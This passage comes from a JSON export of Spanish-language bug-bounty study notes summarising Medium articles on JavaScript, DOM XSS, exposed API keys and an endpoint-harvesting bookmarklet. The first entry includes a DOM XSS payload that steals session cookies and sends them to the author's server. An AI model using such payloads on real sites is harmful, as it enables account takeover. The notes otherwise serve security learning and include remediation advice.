      "note": "En busca de sumideros\nDescargu√© el JS y lo escane√© manualmente.\n\nDentro, vi la sant√≠sima trinidad de los pecados de DOM XSS :\n\n\nvar userInput = location.hash.substring(1);\ndocument.getElementById(\"profileName\").innerHTML = userInput;\n\nPoC completamente armado (Explotaci√≥n realista)\nCarga √∫til:\n\nCopiar\nhttps://app.target.com/#<svg onload=fetch('https://myserver.com?c='+document.cookie)>\nüíÄ Esto ser√≠a:\n\nRobar cookies de sesi√≥n silenciosamente\nEnv√≠alo a mi servidor (controlado)\nEs posible tomar control total de la cuenta con solo un clic de la v√≠ctima\n(¬°S√≠, mi servidor registr√≥ las cookies maravillosamente! \n\n\n\nConsejos avanzados adicionales para DOM XSS\nüîπ Patrones de expresiones regulares personalizados :\n\n\nregex\n(location\\.\\w+|document\\.\\w+)\\s*=\\s*[^\\n;]+\n\n‚úÖ Centrarse en:\n\nlocation.hash\nlocation.search\ndocument.URL\ndocument.referrer",
      "editedTs": 1761524181289,
      "status": "muybueno"
    },
    {
      "id": "9ycvpeb",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@vipulsonule71/finding-exposed-sensitive-api-keys-in-js-files-a-hackers-guide-%EF%B8%8F-%EF%B8%8F-50809fe2c52a",
      "note": "nfracciones en el mundo real\nüî• Uber (2016): Las credenciales de AWS expuestas en GitHub provocaron una filtraci√≥n masiva de datos.\nüéÆ EA Games : las claves de AWS encontradas en repositorios p√∫blicos permitieron el acceso a los servidores del juego.\nüí≥ Pasarelas de pago : varios investigadores obtuvieron recompensas por errores por encontrar secretos de Stripe.\nConsejo sobre recompensas por errores\nEn plataformas como HackerOne o Bugcrowd, estos informes suelen ser muy valiosos , siempre que la clave sea lo suficientemente sensible.\n\nEjemplos de t√≠tulos de informes:\n\nExposed AWS Secret Key in public JS file\nHardcoded Stripe secret in production JS\nFirebase DB exposed without auth in JS config\nüîê C√≥mo proteger secretos (para desarrolladores)\n‚úÖ 1. Nunca codifiques secretos en el c√≥digo frontend\nColoque √∫nicamente claves que sean p√∫blicas (por ejemplo, la clave del navegador de Google Maps).\n\n‚úÖ 2. Utilice variables de entorno\nMantenga los secretos en el servidor, no en el cliente.\n\nCopiar\n// BAD üëé\nconst apiKey = \"sk_live_secretkey\";\n// GOOD üëç\napp.get('/config', (req, res) => {\n  res.json({ publicKey: process.env.STRIPE_PUB_KEY });\n});\n‚úÖ 3. Establecer restricciones de claves\nUtilice paneles (por ejemplo, Google Cloud, AWS IAM) para restringir el uso mediante:\n\nDirecci√≥n IP\nReferente (dominio)\nExpiraci√≥n\n‚úÖ 4. Audita tu base de c√≥digo\nUtilice gitleaks, truffleHog, o el escaneo secreto de GitHub para detectar secretos expuestos antes de enviar c√≥digo.\n\n‚úÖ 5. Rota los secretos con frecuencia\nSi algo gotea, no se asuste: simplemente r√≥telo lo antes posible.",
      "editedTs": 1761524613114,
      "status": "regular"
    },
    {
      "id": "bq0xb9o",
      "title": "configuracionmarcador",
      "payload": "https://freedium.cfd/https://osintteam.blog/this-is-how-i-use-browser-to-fetch-js-endpoints-for-good-paying-bugs-3ca824e20aa5",
      "note": "super bueno codigo para extrar todos los nombre de archivos js extensiones y demas solo navegando normal estatico dinamico doom etc configuracion como un marcado etc y solo activas y listo interesante.\n\n\njavascript:(function(){var scripts=document.getElementsByTagName(\"script\"),regex=/(?<=(\\\"|\\'|\\`))\\/[a-zA-Z0-9_?&=\\/\\-\\#\\.]*(?=(\\\"|\\'|\\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;\"\"!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log(\"An error occurred: \",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+\"<br>\")})}setTimeout(writeResults,3e3);})();\n\ntiene algunas limitacion como no captura del todo archivos generados dinamicamte etc entres otros satura con mcuas peticioens y innter etc rompe el codiugo actual lo sobreescribe y tambien tiene limitacion de extensiones a buscar lo mejore un poco quedo asi:\n\n(async function(){\n  // ==== CONFIG ====\n  const outputMode = 'overlay'; // 'overlay' | 'console' | 'download' | 'document'\n  const concurrency = 5; // peticiones concurrentes max\n  const captureFetchResponses = true; // hook para capturar fetch/XHR (√∫til en lab)\n  const includeExtensions = ['.js','.mjs','.json','.map','.css','.wasm','.svg','.txt','.xml','.html'];\n  const timeoutMs = 10000; // timeout por fetch\n  // ==================\n\n  // regex: captura URLs relativas y absolutas con extensiones (entre comillas)\n  const extPattern = includeExtensions.map(e=>e.replace('.','\\\\.') ).join('|');\n  const regex = new RegExp('(?<=([\"\\'`]))(?:https?:\\\\/\\\\/[^\"\\'`\\\\s]+|\\\\/[\\\\w\\\\-\\\\.\\\\/\\\\?\\\\=\\\\&\\\\%\\\\#]+|[\\\\.]{0,2}\\\\/[\\\\w\\\\-\\\\.\\\\/\\\\?\\\\=\\\\&\\\\%\\\\#]+)(?:' + '(?:' + extPattern + ')(?:\\\\b|[\\\\?\\\\#])' + ')', 'g');\n\n  const results = new Map(); // url -> {sourceSet: Set(), body?}\n  const addUrl = (u,source)=>{ if(!u) return; if(!results.has(u)) results.set(u,{sources:new Set(), body:null}); results.get(u).sources.add(source); };\n\n  // safe fetch with timeout and returning text if CORS allows\n  async function safeFetchText(url){\n    try{\n      const controller = new AbortController();\n      const t = setTimeout(()=>controller.abort(), timeoutMs);\n      const resp = await fetch(url, {cache:'no-store', signal: controller.signal});\n      clearTimeout(t);\n      // if response is opaque (no-cors) we can't read text\n      if(resp.type === 'opaque') return {ok:false, opaque:true};\n      if(!resp.ok) return {ok:false, status: resp.status};\n      const text = await resp.text();\n      return {ok:true, text};\n    }catch(e){\n      return {ok:false, error: String(e)};\n    }\n  }\n\n  // promise pool\n  async function pool(tasks, limit){\n    const out = [];\n    const executing = [];\n    for (const task of tasks){\n      const p = Promise.resolve().then(()=>task());\n      out.push(p);\n      executing.push(p);\n      if(executing.length >= limit){\n        await Promise.race(executing).catch(()=>{/* swallow */});\n        // remove settled\n        for (let i = executing.length-1;i>=0;i--){\n          if (executing[i].then) {\n            // no direct way to test settled; prune by reassigning\n          }\n        }\n        // Quick prune: keep only pending via filter by unresolved (approx)\n        executing.splice(0, executing.length - limit + 1);\n      }\n    }\n    return Promise.allSettled(out);\n  }\n\n  // get all <script> src and inline script text\n  function scanDOM(){\n    const scripts = Array.from(document.getElementsByTagName('script'));\n    scripts.forEach(s=>{\n      if(s.src) addUrl(s.src, 'script.src');\n      if(s.textContent) {\n        let m;\n        while((m = regex.exec(s.textContent)) !== null) addUrl(m[0],'script.inline');\n      }\n    });\n    // scan HTML\n    const html = document.documentElement.outerHTML;\n    let mm;\n    while((mm = regex.exec(html)) !== null) addUrl(mm[0],'html');\n  }\n\n  // observe dynamic insertions\n  const mo = new MutationObserver(muts=>{\n    for(const mu of muts){\n      for(const n of mu.addedNodes){\n        if(n.nodeType===1){\n          if(n.tagName && n.tagName.toLowerCase() === 'script'){\n            const src = n.src || null;\n            if(src) addUrl(src,'mutation.script.src');\n            if(n.textContent){\n              let m;\n              while((m = regex.exec(n.textContent)) !== null) addUrl(m[0],'mutation.script.inline');\n            }\n          } else {\n            // scan node HTML for matches\n            const txt = n.outerHTML || n.textContent || '';\n            let m;\n            while((m = regex.exec(txt)) !== null) addUrl(m[0],'mutation.node');\n          }\n        }\n      }\n    }\n  });\n  mo.observe(document.documentElement, {childList:true, subtree:true, attributes:false});\n\n  // optional: hook fetch / XHR to record dynamic requests\n  function hookNetwork(){\n    if(!captureFetchResponses) return;\n    // fetch\n    const _fetch = window.fetch;\n    window.fetch = async function(input, init){\n      try {\n        const resp = await _fetch.apply(this, arguments);\n        try {\n          // clone to be able to read body without breaking original\n          const clone = resp.clone();\n          // attempt to read text if same-origin / CORS allows\n          if(clone.type !== 'opaque'){\n            const ct = clone.headers.get('content-type') || '';\n            if(ct.includes('application') || ct.includes('text') || ct.includes('json') || ct.includes('javascript') || ct.includes('xml')){\n              const txt = await clone.text().catch(()=>null);\n              if(txt) {\n                // attempt to find matches inside body\n                let m;\n                while((m = regex.exec(txt)) !== null) addUrl(m[0], 'fetch.response');\n              }\n            }\n          }\n        } catch(e){}\n        // register the requested url\n        try {\n          const url = (typeof input === 'string')? input: (input && input.url) || (init && init.url);\n          if(url) addUrl(url,'fetch.request');\n        } catch(e){}\n        return resp;\n      } catch(e){\n        throw e;\n      }\n    };\n    // XHR\n    const XHR = window.XMLHttpRequest;\n    function ProxyXHR(){\n      const xhr = new XHR();\n      const _open = xhr.open;\n      xhr.open = function(method, url){\n        addUrl(url, 'xhr.open');\n        return _open.apply(xhr, arguments);\n      };\n      const _onload = xhr.onload;\n      xhr.addEventListener('load', function(){\n        try {\n          const ct = xhr.getResponseHeader && xhr.getResponseHeader('content-type')||'';\n          if(ct && (ct.includes('javascript') || ct.includes('json') || ct.includes('text') || ct.includes('xml'))) {\n            const txt = xhr.responseText || null;\n            if(txt){\n              let m;\n              while((m = regex.exec(txt)) !== null) addUrl(m[0],'xhr.response');\n            }\n          }\n        } catch(e){}\n      });\n      return xhr;\n    }\n    window.XMLHttpRequest = ProxyXHR;\n  }\n\n  // Build fetch tasks for each unique url and attempt to read body\n  async function fetchAll(){\n    const toFetch = [];\n    for (const [url, meta] of results.entries()){\n      toFetch.push(async ()=>{\n        // skip data: blob: about: etc\n        if(url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('about:')) return;\n        const res = await safeFetchText(url);\n        if(res.ok && res.text) results.get(url).body = res.text.slice(0, 20000); // keep up to 20k chars\n        else results.get(url).error = res;\n      });\n    }\n    await pool(toFetch, concurrency);\n  }\n\n  // OUTPUT helpers\n  function showOverlay(text){\n    const existing = document.getElementById('__aquiles_js_scan_overlay');\n    if(existing) existing.remove();\n    const div = document.createElement('div');\n    div.id = '__aquiles_js_scan_overlay';\n    div.style.position = 'fixed';\n    div.style.right = '10px';\n    div.style.top = '10px';\n    div.style.zIndex = 2147483647;\n    div.style.maxHeight = '80vh';\n    div.style.overflow = 'auto';\n    div.style.background = 'rgba(0,0,0,0.85)';\n    div.style.color = 'white';\n    div.style.padding = '10px';\n    div.style.fontSize = '12px';\n    div.style.borderRadius = '8px';\n    div.style.minWidth = '320px';\n    div.innerHTML = text;\n    const close = document.createElement('button');\n    close.textContent = 'Close';\n    close.style.display='block';\n    close.onclick = ()=>div.remove();\n    div.appendChild(close);\n    document.body.appendChild(div);\n  }\n  function downloadText(name, content){\n    const a = document.createElement('a');\n    a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));\n    a.download = name;\n    a.click();\n    setTimeout(()=>URL.revokeObjectURL(a.href), 30000);\n  }\n\n  // MAIN\n  try{\n    scanDOM();\n    hookNetwork();\n    // small delay to let page possibly inject initial dynamic scripts\n    await new Promise(r=>setTimeout(r, 1500));\n    // build tasks to fetch discovered urls\n    await fetchAll();\n\n    // prepare output\n    const lines = [];\n    for (const [url, meta] of results.entries()){\n      lines.push(`${url}  // sources: ${[...meta.sources].join(', ')}${meta.error ? ' // err:'+JSON.stringify(meta.error) : ''}`);\n    }\n    const out = lines.join('\\n');\n    if(outputMode === 'console') {\n      console.log('JS scan results:', out);\n      alert('Scan finished: revis√° la consola (console.log).');\n    } else if(outputMode === 'overlay'){\n      showOverlay('<pre style=\"white-space:pre-wrap; max-width:700px;\">' + escapeHtml(out).slice(0,20000) + '</pre>');\n    } else if(outputMode === 'download'){\n      downloadText('js-scan-results.txt', out);\n      alert('Archivo generado: js-scan-results.txt');\n    } else if(outputMode === 'document'){\n      document.open(); document.write('<pre>'+escapeHtml(out)+'</pre>'); document.close();\n    }\n  } catch(e){\n    console.error('Scan failed', e);\n    alert('Scan failed: '+String(e));\n  }\n\n  // Escape helper\n  function escapeHtml(s){\n    return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');\n  }\n\n})();",
      "editedTs": 1761525305704,
      "status": "excelente"
    },
    {
      "id": "zdtfczx",
      "title": "Nuevo informe",
      "payload": "https://anishkashukla.medium.com/hacking-javascript-files-to-get-the-sensitive-data-2526416a8afd",
      "note": "nada interesante.",
      "editedTs": 1761525428209,
      "status": "monton"
    },
    {
      "id": "vwkd5d4",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@vipulsonule71/secrets-in-javascript-finding-api-keys-and-endpoints-like-a-bug-bounty-hunter-613c66412baa",
      "note": "pues solo la regla regex de api generica nada mas la img.",
      "editedTs": 1761525619047,
      "status": "regular"
    },
    {
      "id": "j06blp1",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@zoningxtr/html-tags-and-their-javascript-interactive-attributes-7534e7de0cb1",
      "note": "Por qu√© JavaScript necesita atributos HTML\nJavaScript interact√∫a con HTML a trav√©s del DOM (Modelo de Objetos del Documento) . Para conectarse din√°micamente con elementos HTML, JS necesita elementos con atributos identificables .\n\n<button>‚ûú Se utiliza para realizar acciones\n‚úÖ Atributos:\nid: Identificador √∫nico\nclass:Se utiliza para CSS y JS\nonclick:Ejecuta directamente una funci√≥n JS cuando se hace clic\ndisabled: Desactiva el bot√≥n\nüîπ Ejemplo:\n<button id = \"myBtn\" onclick = \"sayHi()\" >Haz clic en m√≠</button>\nfunci√≥n sayHi () { \n  alerta (\"¬°Hola!\"); \n}\n2. <input>‚ûú Para texto, casillas de verificaci√≥n, contrase√±as, etc.\n‚úÖ Atributos:\ntype: Especifica el tipo (texto, contrase√±a, etc.)\nid,class\nonchange, oninput, onfocus, onblur: Ganchos de eventos JS\nvalue: Valor de entrada\nüîπ Ejemplo:\n< tipo de entrada  = \"texto\" id = \"nombre de usuario\" oninput = \"checkName()\" /> \nfunci√≥n  checkName ( ) { \n  const nombre = document.getElementById ( \" nombre de usuario\" ) . valor ; console.log ( \" El usuario escribi√≥:\" , nombre); }\n  \n3. <form>‚ûú Envuelve los campos de entrada\n‚úÖ Atributos:\nonsubmit: Validaci√≥n de JS\naction:D√≥nde se env√≠an los datos\nmethod: OBTENER o PUBLICAR\nid,class\nüîπ Ejemplo:\n<form id = \"loginForm\" onsubmit = \"return validateForm()\" > \n  <input type = \"text\"  id = \"user\" /> \n  <button type = \"submit\" >Iniciar sesi√≥n</button> \n</form>\nfunci√≥n  validateForm ( ) { \n  const u = document.getElementById ( \"usuario\" ) . value ; if (u === '' ) { alert ( \" Se requiere nombre de usuario\" ); return false ; // Evitar el env√≠o del formulario   } return true ; }\n  \n    \n     \n\n   \n4. <a>(Etiqueta de ancla) üîó\n‚úÖ Atributos:\nhref: Destino del enlace\nonclick:Intercepta clics para un comportamiento JS personalizado\nid,class\nüîπ Ejemplo:\n< a  href = \"#\"  onclick = \"loadMore()\" > Cargar m√°s </ a >\nfunci√≥n loadMore () { \n  alerta (\"Cargando contenido...\"); \n}\n5. <select>& <option>‚ñº Men√∫s desplegables\n‚úÖ Atributos:\nonchange:Se activa cuando cambia la selecci√≥n\nid, value,class\nüîπ Ejemplo:\n< select  id = \"colorPicker\"  onchange = \"changeColor()\" > \n  < valor de la opci√≥n  = \"rojo\" > Rojo </ opci√≥n > \n  < valor de la opci√≥n  = \"azul\" > Azul </ opci√≥n > \n</ select >\nfunci√≥n  changeColor ( ) { \n  const color = document.getElementById ( \" colorPicker \" ) . value ; \n  document.body.style.backgroundColor = color ; }‚Äã\n6. <img>üì∏ Imagen\n‚úÖ Atributos:\nsrc, alt, id,class\nonclick:Se utiliza para la funcionalidad de caja de luz/galer√≠a\nüîπ Ejemplo:\n<img src= \"cat.jpg\"  id = \"catPic\" onclick= \"zoomIn(esto)\" />\nfunci√≥n  zoomIn ( img ) { \n  img.style.width = \" 500px \" ; \n}\n7. <div>/ <span>‚ûú Contenedores\n‚úÖ Atributos:\nid, class, onclick, onmouseover,onmouseout\nüîπ Ejemplo:\n<div id = \"box\" onclick= \"changeText()\" >Haz clic en m√≠</div>\nfunci√≥n  changeText ( ) { \n  document.getElementById ( \"box\" ) . innerText = \"¬°Cambiado! \" ; }\n8. <label>üìÑ &<textarea>\n‚úÖ Atributos:\nfor: Vincula la etiqueta a la entrada\noninput, onchangepara<textarea>\nüîπ Ejemplo:\n< etiqueta  para = \"msg\" > Mensaje: </ etiqueta > \n< √°rea de texto  id = \"msg\"  oninput = \"countChars()\" > </ √°rea de texto >\nfunci√≥n  countChars ( ) { \n  const len ‚Äã‚Äã= document.getElementById ( \"msg\" ) . value.length ; console.log ( \" Caracteres escritos:\" , len) ; }\n  \nBono: Uso de data-*atributos\nLos atributos de datos personalizados son una forma poderosa de adjuntar informaci√≥n personalizada a los elementos.\n\nüîπ Ejemplo:\n< div  data-user-id = \"42\"  onclick = \"loadUser(this)\" > Informaci√≥n del usuario </ div >\nfunci√≥n  loadUser ( elem ) { \n  const id = elem.getAttribute ( \"data-user-id\" ); \n  console.log ( \" Cargando usuario con ID:\" , id); }",
      "editedTs": 1761525736594,
      "status": "muybueno"
    },
    {
      "id": "abat6as",
      "title": "Contexto js",
      "payload": "https://medium.com/@zoningxtr/before-code-runs-understanding-the-javascript-execution-environment-fe79047926af",
      "note": "¬øQu√© es un ‚ÄúContexto de Ejecuci√≥n‚Äù?\nUn contexto de ejecuci√≥n es el entorno en el que se ejecuta el c√≥digo JavaScript . Cada vez que se ejecuta un script, se crea uno.\n\nPiense en ello como una caja donde las variables, funciones y thispalabras clave residen temporalmente mientras se ejecuta el c√≥digo.\n\nüî• Todos los tipos comunes de contextos de ejecuci√≥n de JavaScript\n1. Contexto de ejecuci√≥n global (GEC)\nSe crea cuando se carga el archivo o la p√°gina JavaScript.\nS√≥lo uno por programa.\nCrea el objeto global ( windowen el navegador, globalen Node.js).\nEjemplo:\n\nvar x = 10 ; funci√≥n saludo  ( ) {    console.log ( \" Hola\" ); }\n2. Contexto de ejecuci√≥n de la funci√≥n\nSe crea cada vez que se llama una funci√≥n.\nCada llamada de funci√≥n crea su propio contexto nuevo.\nAlmacena argumentos, variables locales y alcance.\nEjemplo:\n\nfunci√≥n  sayHi ( nombre ) {    var saludo = \"Hola \" + nombre;    console.log (saludo); } sayHi ( \" Alice\" ); // nuevo contexto de ejecuci√≥n creado\n3. Contexto de ejecuci√≥n de la evaluaci√≥n (raro y peligroso)\nSe crea cuando se ejecuta el c√≥digo dentro de eval().\nPuede acceder al √°mbito local si evalse utiliza directamente.\nPeligroso y desanimado.\nEjemplo:\n\nevaluaci√≥n ( \"var z = 100;\" ); consola . iniciar sesi√≥n (z); // 100\nüï≥Ô∏è ‚ÄúPuntos‚Äù de ejecuci√≥n de JavaScript no est√°ndar o complicados\nEstos no son ‚Äúcontextos de ejecuci√≥n‚Äù formales, sino lugares donde se ejecuta el c√≥digo JS :\n\n4. Controladores de eventos ( onclick, onerror, etc.)\nC√≥digo en l√≠nea en HTML:\n< button  onclick = \"alert('¬°Hizo clic!')\" > Clic </ button >\n5. Temporizadores\nEl c√≥digo se ejecuta en su propio contexto cuando se activa el temporizador.\nsetTimeout(() => { alert(\"Delayed alert\"); }, 1000);\n\n6. javascript:URL\nLa ejecuci√≥n ocurre cuando el usuario hace clic en el enlace.\n< a  href = \"javascript:alert('XSS')\" > Haga clic </ a >\n7. <script>Etiquetas\nEl c√≥digo dentro de a <script>se ejecuta en el contexto global.\n< script > alerta ( \"Ejecutando en contexto global\" ) </ script >\n8. Ejecuci√≥n din√°mica de c√≥digo:\nUsando eval(), new Function(), osetTimeout('...')\neval ( \"alert('Eval!')\" ); new  Function ( \"alert('¬°Constructor de funci√≥n!')\" )(); setTimeout ( \"alert('De cadena')\" , 1000 );\n9. <iframe srcdoc>o scripts en l√≠nea en marcos aislados\nEstos crean un nuevo contexto pero pueden aislarse.\n<iframe srcdoc=\"<script>alert('iframe')</script>\"></iframe>\n\n10. Trabajadores de servicio/Trabajadores web\nTienen su propio contexto aislado, separado del DOM.\n\n11. Interoperabilidad entre WebAssembly y JS\nJS se ejecuta en su propio contexto, pero puede interactuar con c√≥digo compilado.\nüîê Consejo de seguridad\nLa mayor√≠a de los ataques XSS tienen como objetivo secuestrar uno de estos puntos de ejecuci√≥n inyectando:\n\nControladores de eventos en l√≠nea ( onerror, onclick)\nGuiones\njavascript:URL\nEvaluaci√≥n din√°mica peligrosa comoeval()",
      "editedTs": 1761525978091,
      "status": "excelente"
    },
    {
      "id": "7eixmt6",
      "title": "Funciones de js",
      "payload": "https://medium.com/@zoningxtr/javascript-all-important-browser-functions-f40423714ebb",
      "note": "Estas son funciones proporcionadas por el entorno del navegador (no el lenguaje JavaScript central): permiten que sus scripts interact√∫en con los usuarios, controlen la p√°gina y se comuniquen con el navegador.\n\nLos agruparemos de la siguiente manera:\n\n‚úÖ Funciones de interacci√≥n del usuario\nü™ü Funciones de control de ventanas\n‚è±Ô∏è Temporizadores (Retraso/Repetici√≥n)\nüìç Funciones de ubicaci√≥n (URL/Redireccionamiento)\nüì§ Funciones de red (Fetch / Ajax)\nFunciones DOM (modelo de objetos de documento)\nüß† Funciones de almacenamiento (Almacenamiento local / Almacenamiento de sesi√≥n)\nFunciones de pantalla y navegador\nFunciones del evento\n\n\nJavaScript + Browser te da el poder de:\n\nHablar con los usuarios ( alert, prompt)\nMoverse por las p√°ginas ( location)\nTiempo de manejo ( setTimeout, setInterval)\nTrabajar con la p√°gina ( DOM)\nAlmacenar datos ( localStorage)\nHacer AJAX ( fetch)\nReaccionar a los clics, desplazamientos, escritura, etc.",
      "editedTs": 1761526233813,
      "status": "excelente"
    },
    {
      "id": "2m47iip",
      "title": "atributos js comprendiendo",
      "payload": "https://medium.com/@zoningxtr/what-is-a-javascript-attribute-e6b4e5b6317c",
      "note": "En HTML , un atributo es algo que se coloca dentro de una etiqueta para configurarlo.\n\nEn JavaScript , a menudo leemos o cambiamos estos atributos utilizando m√©todos DOM, especialmente en elementos HTML.\n\nLos atributos de evento de JavaScript son atributos HTML que son pares clave-valor que se definen dentro de los elementos HTML para activar eventos dentro de los c√≥digos JavaScript.\n\nAs√≠ que decimos:\n\nLos elementos HTML tienen atributos como src, href, id, type, etc.\nJavaScript nos permite obtener , establecer o eliminar esos atributos din√°micamente.",
      "editedTs": 1761527319214,
      "status": "excelente"
    },
    {
      "id": "iov29pw",
      "title": "Entiendo js",
      "payload": "https://medium.com/@zoningxtr/what-is-javascript-and-why-hackers-love-it-b6135b3d089e",
      "note": "‚úÖEljavascript:\nEl esquema URI es un tipo especial de URL que le permite ejecutar c√≥digo JavaScript en l√≠nea directamente desde lugares que aceptan URL, como un enlace ( <a>) o una acci√≥n de formulario.\n\nCuando veas esto en una <a>etiqueta:\n\n< a  href = \"javascript:alert(1)\" > Haz clic en m√≠ </ a >\nLe est√° diciendo al navegador:\n\n\"Oye, en lugar de ir a un sitio web como http://example.com, ejecuta alg√∫n c√≥digo JavaScript\".\n\nPor eso es una URL , aunque no vaya a un servidor: solo ejecuta c√≥digo en el contexto de la p√°gina actual.\n\n‚úÖ C√≥mo javascript:funciona enhref\nLa mayor√≠a de las personas est√°n familiarizadas con href=\"https://...\", pero hreftambi√©n pueden se√±alar otros protocolos , como:\n\nmailto:someone@example.com\ntel:+123456789\njavascript:‚Üê esta es clave\nüìå javascript:es un protocolo compatible con el navegador\nCuando un usuario hace clic en un enlace con href=\"javascript:...\", el navegador ejecuta el c√≥digo JavaScript que sigue.\n\nüî•¬øC√≥mo funciona?\nAl hacer clic en ese enlace, el navegador lo ve href=\"javascript:...\"y ejecuta el c√≥digo JavaScript que lo sigue.\n\n\n\nEntonces:\n\n< a  href = \"javascript:alert(1)\" > Haz clic en m√≠ </ a >\n‚û°Ô∏è Al hacer clic se ejecuta:\n\nalerta ( 1 );\nü§Ø Ejemplo del mundo real\nDigamos que visitas una p√°gina como √©sta:\n\nhttp://victim.com/level5/frame/signup?next=javascript:alert(1)\nY esa p√°gina tiene:\n\n< a  href = \"{{ next }}\" > Siguiente >> </ a >\nEsto se convierte en:\n\n< a  href = \"javascript:alert(1)\" > Siguiente >> </ a >\nCuando el usuario hace clic en ‚ÄúSiguiente >>‚Äù, no navega a una nueva p√°gina , simplemente se ejecuta alert(1)directamente en su navegador.\n\n¬°Boom! Eso es XSS reflejado.\n\nüß†¬øPor qu√© se llama ‚ÄúURL‚Äù?\nPorque t√©cnicamente es una URL , pero no una que conduce a un archivo o una p√°gina web: es un ‚Äúcontexto de ejecuci√≥n de JavaScript‚Äù .\n\nPi√©nsalo de esta manera:\n\nURL normal https://example.com‚Üí Carga una p√°gina web\n\njavascript:alert(1)‚Üí Ejecuta c√≥digo JavaScript\n\nEl navegador lo maneja como cualquier otro esquema ( http:, mailto:, ftp:, etc.), excepto que en lugar de recuperar un recurso, ejecuta el c√≥digo .\n\nüîê ¬øPor qu√© es esto peligroso?\njavascript:Los enlaces se ejecutan con los mismos privilegios que la p√°gina original.\nLos atacantes pueden robar cookies , realizar acciones en nombre de los usuarios o manipular el DOM.\nüõë D√≥nde est√° bloqueado o restringido:\nLos navegadores modernos a menudo bloquean javascript:las URL en:\n\nLa barra de direcciones (algunas p√°ginas)\nAdentro<iframe src=\"javascript:...\">\nSitios con encabezados CSP fuertes",
      "editedTs": 1761527566082,
      "status": "excelente"
    },
    {
      "id": "o1x26oc",
      "title": "Funciones integradas js",
      "payload": "https://medium.com/@zoningxtr/javascript-built-in-functions-7a4070ca592a",
      "note": "Las funciones integradas son funciones predefinidas en JavaScript que puedes usar de inmediato, sin necesidad de definirlas t√∫ mismo.\n\nVienen de:\n\nEl lenguaje JavaScript en s√≠\nEl entorno del navegador (como alert, prompt, etc.)\nObjetos como Math, Array, String, etc.\nüìö Categor√≠as de funciones integradas\nExploraremos las funciones integradas de:\n\nüì¢ Funciones del navegador\nFunciones matem√°ticas\nFunciones de cadena\nFunciones de matriz\nüìÖ Funciones de fecha\nüîß Funciones de verificaci√≥n/conversi√≥n de tipos\n1Ô∏è‚É£ üì¢ Funciones del navegador\nalert()Muestra una alerta emergente\n\nprompt()Muestra un cuadro de texto y obtiene la entrada del usuario.\n\nconfirm()Muestra una ventana emergente S√≠/No, devuelve verdadero/falso\n\nconsole.log()Imprime en la consola del navegador\n\nalert ( \"¬°Hola!\" ); \nlet name = prompt ( \"¬øCu√°l es tu nombre?\" ) ; \nlet ok = confirm ( \" ¬øEst√°s seguro?\" ); \nconsole.log ( \"El usuario dijo:\" , ok);\n2Ô∏è‚É£ üßÆ Funciones matem√°ticas\nJavaScript proporciona un objeto integrado Math:\n\nDescripci√≥n de la funci√≥n Math.round(x)Redondea al entero m√°s cercano\n\nMath.ceil(x)Redondeos\n\nMath.floor(x)Redondea hacia abajo\n\nMath.random()N√∫mero aleatorio (0 a <1)\n\nMath.max(a,b)Devuelve el n√∫mero m√°s alto\n\nMath.min(a,b)Devuelve el n√∫mero m√°s bajo\n\nMath.pow(a,b)a elevado a b\n\nMath.sqrt(x)Ra√≠z cuadrada\n\nconsola.log ( Math.round ( 4.6 ) );   // 5 consola.log ( Math.random ( ) ) ;    // p . ej . 0.38289 consola.log ( Math.pow ( 2 , 3 ))   ; // 8\n\n3Ô∏è‚É£ üìú Funciones de cadena\nEstos son para manipular texto:\n\nlengthObtiene la longitud de la cadena\n\ntoUpperCase()Convierte a may√∫sculas\n\ntoLowerCase()Convierte a min√∫sculas\n\ncharAt(index)Obtiene el car√°cter en una posici√≥n includes(\"text\")Comprueba si la cadena contiene texto indexOf(\"text\")Encuentra la posici√≥n del texto slice(start, end)Corta una parte de la cadena replace(\"a\", \"b\")Reemplaza el texto trim()Elimina los espacios del inicio y del final split(\"separator\")Se divide en una matriz\n\nlet msg = \" Hola Mundo\" ; \nconsole.log (msg.trim ( ) ) ;              // \"Hola Mundo\" console.log \n( msg.toUpperCase ( ));       // \" HOLA MUNDO\" console.log (msg.includes ( \" Mundo\" ));   // verdadero console.log ( msg.charAt ( 1 ));           // \"H\"\n\n4Ô∏è‚É£ üì¶ Funciones de matriz\npush(item)A√±ade elemento al final\n\npop()Elimina el √∫ltimo elemento\n\nshift()Elimina el primer elemento\n\nunshift(item)A√±ade elemento al inicio\n\nlengthDevuelve el n√∫mero de elementos\n\njoin(\",\")Convierte una matriz en una cadena\n\nconcat(arr)Une matrices\n\nslice(start, end)Obtiene parte de la matriz\n\nsplice(start, count)Elimina/a√±ade elementos\n\nindexOf(item)Encuentra el √≠ndice del art√≠culo\n\nincludes(item)Comprueba si la matriz tiene un elemento\n\nforEach()Recorre la matriz\n\nmap()Crea una nueva matriz con valores modificados\n\nilter()Filtra elementos seg√∫n su condici√≥n\n\nreduce()Reduce la matriz a un √∫nico valor\n\nlet fruits = [ \"manzana\" , \"pl√°tano\" , \"mango\" ]; \nfruits.push( \"naranja\" );      // [ \"manzana\" , \"pl√°tano\" , \"mango\" , \"naranja\" ] \nfruits.pop();               // elimina \"naranja\"\n fruits.forEach( f => console.log(f)); // repite todo\n5Ô∏è‚É£ üìÖ Funciones de fecha\nlet now =  new  Date ( ); \nconsole.log ( now.toString ( ));        // fecha y hora completas console.log  ( now.getFullYear ());    // a√±o console.log ( now.getMonth ( ) );       // mes ( 0 = ene . ) console.log (now.getDate());        // d√≠a del mes console.log (now.getHours() ) ;       // hora   \n \n  \n  \n \n6Ô∏è‚É£ üîß Comprobaci√≥n/Conversi√≥n de tipos\ntypeof xDevuelve el tipo de una variable\n\nparseInt(\"123\")Convierte una cadena en un entero\n\nparseFloat(\"3.14\")Convierte cadena en flotante\n\nNumber(\"5\")Convierte a n√∫mero\n\nString(123)Convierte en cadena\n\nisNaN(x)Comprueba si el valor no es un n√∫mero\n\nsea ‚Äã‚Äãx = \"123\" ; \nconsole.log ( typeof x);         // \"string\" 